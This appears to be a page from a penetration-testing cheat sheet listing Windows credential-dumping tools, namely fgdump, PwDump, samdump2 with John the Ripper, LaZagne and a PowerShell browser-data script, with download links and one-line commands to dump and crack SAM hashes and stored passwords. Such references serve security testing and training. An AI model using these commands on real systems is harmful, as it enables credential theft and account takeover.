# Other Tools / Techniques

### credential editor

This tool can be used to extract credentials from the memory. Download it from:

{% embed url="https://www.ampliasecurity.com/research/windows-credentials-editor/" %}

### fgdump

Extract credentials from the SAM file. You can find this binary inside Kali, just do:

```text
 locate fgdump.exe
```

then run it on windows:

```text
fgdump.exe
```

### PwDump

Extract credentials from the SAM file

You can find this binary inside Kali, just do:

```text
locate pwdump.exe
```

run it on windows with:

```text
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### Generate a hash file for John using pwdump or samdump2.

```text
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```

Then crack it with:

```text
john -format=NT /root/sam.txt
```

### PwDump7

{% embed url="http://www.tarasco.org/security/pwdump\_7" %}

### Lazagne

{% embed url="https://github.com/AlessandroZ/LaZagne/releases/" %}

{% embed url="https://github.com/AlessandroZ/LaZagne" %}

```text
lazagne.exe all
```

### get-browserdata\(powershell\)

{% embed url="https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Get-BrowserData.ps1" %}

```text
Get-BrowserData.ps1 | Format-List
```



